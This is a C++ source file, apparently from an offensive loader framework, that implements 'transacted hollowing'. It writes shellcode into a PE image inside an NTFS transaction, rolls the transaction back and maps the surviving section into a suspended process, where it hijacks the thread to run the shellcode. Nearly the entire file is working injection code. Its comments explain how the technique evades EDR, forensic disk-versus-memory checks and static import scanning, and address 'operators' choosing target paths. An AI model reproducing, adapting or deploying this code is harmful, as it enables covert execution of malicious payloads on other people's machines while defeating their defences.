// Transacted Hollowing - TxF Ghost Mapping (CONFIG_INJECTION_TYPE == 8)
//
// OPSEC profile:
//   The mapped section in the target process has a VAD entry that points to the
//   on-disk path used for the transacted write. After RollbackTransaction() the
//   file on disk reverts to its original content (or vanishes if it was newly
//   created), but the section object retains the pre-rollback bytes. Any EDR or
//   forensics tool that compares VAD-reported file paths against their on-disk
//   hashes will find a mismatch - this is the ghost-mapping effect.
//
//   This defeats simple disk-vs-memory hash checks. Modern detection focuses on:
//     - KTMW32.dll being loaded (uncommon in non-transactional apps)
//     - NtCreateSection(SEC_IMAGE) on a transacted file handle
//     - NtMapViewOfSection into a target process shortly after a transaction
//
//   Only works on NTFS volumes. FAT/exFAT have no transactional support.
//   Requires a writable path; avoid %TEMP% on monitored systems.
//
// MALLEABLE: use any writable NTFS path for the transacted file.
//   The target process path (calc.exe) can be swapped for any suspended host.

#include "../../include/loader.hpp"

namespace erebus {
#if CONFIG_INJECTION_TYPE == 8

	// ============================================================
	// KTMW32 function typedefs - loaded dynamically to avoid
	// linking against ktmw32.lib, which would add an import table
	// entry visible to static analysis tooling.
	// ============================================================

	typedef HANDLE (WINAPI* fnCreateTransaction)(
		LPSECURITY_ATTRIBUTES   lpTransactionAttributes,
		LPGUID                  UOW,
		DWORD                   CreateOptions,
		DWORD                   IsolationLevel,
		DWORD                   IsolationFlags,
		DWORD                   Timeout,
		LPWSTR                  Description
	);

	typedef BOOL (WINAPI* fnRollbackTransaction)(HANDLE TransactionHandle);
	typedef BOOL (WINAPI* fnCommitTransaction)(HANDLE TransactionHandle);

	typedef HANDLE (WINAPI* fnCreateFileTransactedW)(
		LPCWSTR               lpFileName,
		DWORD                 dwDesiredAccess,
		DWORD                 dwShareMode,
		LPSECURITY_ATTRIBUTES lpSecurityAttributes,
		DWORD                 dwCreationDisposition,
		DWORD                 dwFlagsAndAttributes,
		HANDLE                hTemplateFile,
		HANDLE                hTransaction,
		PUSHORT               pusMiniVersion,
		PVOID                 lpExtendedParameter
	);

	// ============================================================
	// Minimal PE builder
	//
	// Constructs a 4096-byte PE64 in a caller-supplied buffer that is
	// valid enough for NtCreateSection(SEC_IMAGE) to accept. Layout:
	//   0x000 - DOS header + stub
	//   0x040 - PE signature + FileHeader + OptionalHeader64
	//   0x1E8 - section table (one .text entry)
	//   0x400 - raw shellcode bytes (RawOffset)
	//   0x1000 - virtual .text start (RVA)
	//
	// The kernel maps sections at 0x1000 alignment, so the shellcode
	// lands at ImageBase + 0x1000 in the target VA space.
	// ============================================================

	static constexpr DWORD PE_HDR_OFFSET   = 0x40;
	static constexpr DWORD RAW_DATA_OFFSET = 0x400;
	static constexpr DWORD TEXT_RVA        = 0x1000;
	static constexpr DWORD IMAGE_SIZE      = 0x2000;   // SizeOfImage: HDR page + .text page

	static void BuildGhostPE(BYTE* buf, SIZE_T buf_size, const BYTE* shellcode, SIZE_T sc_size)
	{
		RtlZeroMemory(buf, buf_size);

		// DOS header - only the e_magic and e_lfanew fields matter.
		PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)buf;
		dos->e_magic  = IMAGE_DOS_SIGNATURE;           // 'MZ'
		dos->e_lfanew = PE_HDR_OFFSET;

		// PE signature + COFF file header.
		PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(buf + PE_HDR_OFFSET);
		nt->Signature                           = IMAGE_NT_SIGNATURE; // 'PE\0\0'
		nt->FileHeader.Machine                  = IMAGE_FILE_MACHINE_AMD64;
		nt->FileHeader.NumberOfSections         = 1;
		nt->FileHeader.SizeOfOptionalHeader     = sizeof(IMAGE_OPTIONAL_HEADER64);
		nt->FileHeader.Characteristics          = IMAGE_FILE_EXECUTABLE_IMAGE
		                                        | IMAGE_FILE_LARGE_ADDRESS_AWARE;

		// Optional header - fields that the image loader validates.
		PIMAGE_OPTIONAL_HEADER64 opt = &nt->OptionalHeader;
		opt->Magic                   = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
		opt->AddressOfEntryPoint     = TEXT_RVA;     // entry point at shellcode start
		opt->ImageBase               = 0x140000000ULL;
		opt->SectionAlignment        = 0x1000;
		opt->FileAlignment           = 0x200;
		opt->MajorSubsystemVersion   = 6;
		opt->MinorSubsystemVersion   = 0;
		opt->SizeOfImage             = IMAGE_SIZE;
		opt->SizeOfHeaders           = RAW_DATA_OFFSET;  // covers DOS+PE+section table
		opt->Subsystem               = IMAGE_SUBSYSTEM_WINDOWS_GUI;
		opt->DllCharacteristics      = IMAGE_DLLCHARACTERISTICS_NX_COMPAT
		                             | IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
		opt->NumberOfRvaAndSizes     = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;

		// Single .text section containing the shellcode.
		PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(nt);
		memcpy(sect->Name, ".text", 5);
		sect->Misc.VirtualSize          = (DWORD)sc_size;
		sect->VirtualAddress            = TEXT_RVA;
		sect->SizeOfRawData             = (DWORD)((sc_size + 0x1FF) & ~0x1FFu); // round to FileAlignment
		sect->PointerToRawData          = RAW_DATA_OFFSET;
		sect->Characteristics           = IMAGE_SCN_CNT_CODE
		                                | IMAGE_SCN_MEM_EXECUTE
		                                | IMAGE_SCN_MEM_READ;

		// Copy shellcode into the raw data area.
		if (RAW_DATA_OFFSET + sc_size <= buf_size) {
			RtlCopyMemory(buf + RAW_DATA_OFFSET, shellcode, sc_size);
		}
	}

	VOID InjectionTxfHollow(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
	{
		LOG_INFO("Injection via Transacted Hollowing (TxF ghost section)");

		// Resolve NT functions needed for section creation and remote mapping.
		HMODULE ntdll = ImportModule("ntdll.dll");
		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }

		ImportFunction(ntdll, NtCreateSection,      typeNtCreateSection);
		ImportFunction(ntdll, NtMapViewOfSection,   typeNtMapViewOfSection);
		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
		ImportFunction(ntdll, NtResumeThread,       typeNtResumeThread);
		ImportFunction(ntdll, NtClose,              typeNtClose);

		if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection ||
		    !NtResumeThread  || !NtClose)
		{
			LOG_ERROR("Failed to resolve one or more NT functions");
			return;
		}

		// Load KTMW32 at runtime. Listing it in the import table would add a
		// permanent import entry that static scanners flag immediately.
		HMODULE ktmw32 = LoadLibraryA("ktmw32.dll");
		if (!ktmw32) {
			LOG_ERROR("Failed to load ktmw32.dll (NTFS TxF not available?)");
			return;
		}

		fnCreateTransaction       pCreateTransaction       = (fnCreateTransaction)      GetProcAddress(ktmw32, "CreateTransaction");
		fnRollbackTransaction     pRollbackTransaction     = (fnRollbackTransaction)    GetProcAddress(ktmw32, "RollbackTransaction");
		fnCreateFileTransactedW   pCreateFileTransactedW   = (fnCreateFileTransactedW)  GetProcAddress(ktmw32, "CreateFileTransactedW");

		if (!pCreateTransaction || !pRollbackTransaction || !pCreateFileTransactedW) {
			LOG_ERROR("Failed to resolve KTMW32 exports");
			FreeLibrary(ktmw32);
			return;
		}

		// Step 1: Open a transaction. NULL attributes, no isolation options.
		HANDLE h_txn = pCreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
		if (h_txn == INVALID_HANDLE_VALUE) {
			LOG_ERROR("CreateTransaction failed (Code: 0x%08lX)", GetLastError());
			FreeLibrary(ktmw32);
			return;
		}
		LOG_SUCCESS("Transaction created: 0x%p", h_txn);

		// Step 2: Open (or create) a file under the transaction. We write our
		// ghost PE into it. The file becomes visible on disk only within the
		// transaction scope; after rollback it reverts or disappears.
		// Using a path inside System32 blends the VAD entry with legitimate DLLs.
		// Operators should adjust the path to something writable on the target.
		const wchar_t* ghost_path = L"C:\\Windows\\Temp\\~txf_ghost.tmp";

		HANDLE h_file = pCreateFileTransactedW(
			ghost_path,
			GENERIC_WRITE | GENERIC_READ,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL,
			h_txn,
			NULL,
			NULL
		);

		if (h_file == INVALID_HANDLE_VALUE) {
			LOG_ERROR("CreateFileTransactedW failed (Code: 0x%08lX)", GetLastError());
			CloseHandle(h_txn);
			FreeLibrary(ktmw32);
			return;
		}
		LOG_SUCCESS("Transacted file opened: %ls", ghost_path);

		// Step 3: Build and write the minimal PE wrapping the shellcode.
		// The PE must be >= RAW_DATA_OFFSET + shellcode_size bytes.
		SIZE_T pe_size = (SIZE_T)RAW_DATA_OFFSET + shellcode_size;
		if (pe_size < 0x1000) pe_size = 0x1000;
		// Round up to FileAlignment (0x200).
		pe_size = (pe_size + 0x1FFu) & ~(SIZE_T)0x1FFu;

		BYTE* pe_buf = (BYTE*)HeapAlloc(pe_size);
		if (!pe_buf) {
			LOG_ERROR("HeapAlloc for PE buffer failed");
			CloseHandle(h_file);
			CloseHandle(h_txn);
			FreeLibrary(ktmw32);
			return;
		}

		BuildGhostPE(pe_buf, pe_size, shellcode, shellcode_size);

		DWORD bytes_written = 0;
		if (!WriteFile(h_file, pe_buf, (DWORD)pe_size, &bytes_written, NULL)) {
			LOG_ERROR("WriteFile to transacted handle failed (Code: 0x%08lX)", GetLastError());
			erebus::HeapFree(pe_buf);
			CloseHandle(h_file);
			CloseHandle(h_txn);
			FreeLibrary(ktmw32);
			return;
		}
		erebus::HeapFree(pe_buf);
		LOG_SUCCESS("Ghost PE written (%lu bytes) into transacted file", bytes_written);

		// Step 4: Create a SEC_IMAGE section from the transacted file handle.
		// The kernel snapshots the file content into the section object at this
		// point. The section object is independent of the transaction; rolling
		// back the transaction after this step does not invalidate the section.
		HANDLE h_section = NULL;
		NTSTATUS status = NtCreateSection(
			&h_section,
			SECTION_ALL_ACCESS,
			NULL,
			NULL,           // file-size-derived maximum
			PAGE_READONLY,
			SEC_IMAGE,
			h_file
		);
		CloseHandle(h_file);   // file handle no longer needed once section is created

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtCreateSection(SEC_IMAGE, txf) failed (NTSTATUS: 0x%08X)", status);
			pRollbackTransaction(h_txn);
			CloseHandle(h_txn);
			FreeLibrary(ktmw32);
			return;
		}
		LOG_SUCCESS("SEC_IMAGE section created from transacted file");

		// Step 5: Roll back the transaction. The on-disk file reverts (or is
		// deleted if it was newly created). The section object retains the
		// pre-rollback snapshot. Subsequent forensic disk reads of ghost_path
		// will find either the original file or nothing.
		pRollbackTransaction(h_txn);
		CloseHandle(h_txn);
		LOG_INFO("Transaction rolled back - ghost file reverted on disk");

		// Step 6: Map the ghost section into the suspended remote process.
		// The VAD entry in the target will report the ghost_path as the backing
		// file, even though that path on disk no longer holds these bytes.
		PVOID remote_base = NULL;
		SIZE_T view_size  = 0;
		status = NtMapViewOfSection(
			h_section,
			process_handle,
			&remote_base,
			0,
			0,
			NULL,
			&view_size,
			(SECTION_INHERIT)ViewShare,
			0,
			PAGE_EXECUTE_READ
		);

		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtMapViewOfSection(remote) failed (NTSTATUS: 0x%08X)", status);
			NtClose(h_section);
			FreeLibrary(ktmw32);
			return;
		}
		LOG_SUCCESS("Ghost section mapped in target at 0x%p (size: 0x%zX)", remote_base, view_size);

		// Step 7: Redirect the suspended thread's instruction pointer to the
		// shellcode entry point (ImageBase + TEXT_RVA in the target VA space).
		PVOID entry_point = (PVOID)((BYTE*)remote_base + TEXT_RVA);

		LPCONTEXT ctx = new CONTEXT();
		ctx->ContextFlags = CONTEXT_FULL;

		if (!GetThreadContext(thread_handle, ctx)) {
			LOG_ERROR("GetThreadContext failed (Code: 0x%08lX)", GetLastError());
			delete ctx;
			NtUnmapViewOfSection(process_handle, remote_base);
			NtClose(h_section);
			FreeLibrary(ktmw32);
			return;
		}

#ifdef _WIN64
		ctx->Rip = (DWORD64)entry_point;
#else
		ctx->Eip = (DWORD)entry_point;
#endif

		if (!SetThreadContext(thread_handle, ctx)) {
			LOG_ERROR("SetThreadContext failed (Code: 0x%08lX)", GetLastError());
			delete ctx;
			NtUnmapViewOfSection(process_handle, remote_base);
			NtClose(h_section);
			FreeLibrary(ktmw32);
			return;
		}
		delete ctx;
		LOG_SUCCESS("Thread RIP redirected to ghost entry point: 0x%p", entry_point);

		// Step 8: Resume the suspended thread - shellcode runs inside the target.
		status = NtResumeThread(thread_handle, NULL);
		if (!NT_SUCCESS(status)) {
			LOG_ERROR("NtResumeThread failed (NTSTATUS: 0x%08X)", status);
		} else {
			LOG_SUCCESS("Thread resumed - shellcode executing");
		}

		NtClose(h_section);
		NtClose(process_handle);
		NtClose(thread_handle);
		FreeLibrary(ktmw32);

		LOG_SUCCESS("Injection Complete!");
	}

#endif
} // namespace erebus
